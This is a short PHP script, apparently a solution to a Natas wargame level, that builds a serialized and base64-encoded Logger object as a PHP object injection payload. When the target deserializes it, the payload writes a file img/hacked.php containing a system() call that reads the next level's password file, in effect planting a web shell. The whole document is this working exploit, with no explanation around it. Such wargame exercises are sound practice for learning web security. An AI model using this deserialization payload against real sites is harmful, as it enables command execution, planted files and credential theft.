<?php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct(){
        // initialise variables
        $this->initMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>"; # To be executed once the webpage is loaded
        $this->exitMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>"; # To be executed once the webpage is loaded
        $this->logFile = "img/hacked.php"; # Store our log file here
    }         
}

$log = new Logger();
echo(base64_encode(serialize($log)));
?>